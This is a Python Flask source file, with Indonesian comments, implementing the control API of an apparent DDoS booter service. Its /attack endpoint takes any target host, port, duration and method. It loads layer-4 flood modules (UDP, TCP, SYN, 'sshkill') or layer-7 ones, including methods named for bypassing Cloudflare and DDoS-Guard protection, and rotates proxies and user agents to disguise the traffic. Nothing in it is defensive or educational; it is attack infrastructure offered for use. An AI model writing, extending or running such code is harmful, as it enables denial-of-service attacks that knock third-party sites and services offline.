from flask import Flask, request, jsonify
import random
import importlib

app = Flask(__name__)

# Load proxy dan user-agent
with open('proxy.txt', 'r') as f:
    proxies = [line.strip() for line in f if line.strip()]

with open('ua.txt', 'r') as f:
    user_agents = [line.strip() for line in f if line.strip()]

# List method layer4 dan layer7
layer4_methods = ['udp', 'tcp', 'syn', 'ovh', 'sshkill', 'tcpbypass', 'udpbypass']
layer7_methods = ['http', 'https', 'get', 'post', 'tls', 'cloudflare', 'cloudflareuam', 'cloudflarecaptcha', 'ddosguard']

@app.route('/attack', methods=['GET'])
def attack():
    host = request.args.get('host')
    port = request.args.get('port')
    time = request.args.get('time')
    method = request.args.get('method')

    if not all([host, port, time, method]):
        return jsonify({'error': 'Missing required parameters'}), 400

    method_lower = method.lower()

    # Tentukan folder berdasarkan jenis method
    if method_lower in layer4_methods:
        folder = 'layer4'
        proxy = None
        user_agent = None
    elif method_lower in layer7_methods:
        folder = 'layer7'
        proxy = random.choice(proxies) if proxies else None
        user_agent = random.choice(user_agents) if user_agents else None
    else:
        return jsonify({'error': f'Unknown method type: {method}'}), 400

    # Import modul secara dinamis
    try:
        attack_module = importlib.import_module(f'methods.{folder}.{method_lower}')
    except ModuleNotFoundError:
        return jsonify({'error': f'Method "{method}" not found in {folder}'}), 404

    if not hasattr(attack_module, 'run_attack'):
        return jsonify({'error': f'Method "{method}" does not implement run_attack()'}), 500

    try:
        result = attack_module.run_attack(host, port, time, proxy, user_agent)
    except Exception as e:
        return jsonify({'error': f'Error running attack: {str(e)}'}), 500

    return jsonify({
        'status': 'attack started',
        'host': host,
        'port': port,
        'time': time,
        'method': method,
	'proxy':proxy,
	'ua':user_agent,
        'result': result
    }), 200

if __name__ == '__main__':
    app.run(debug=True)
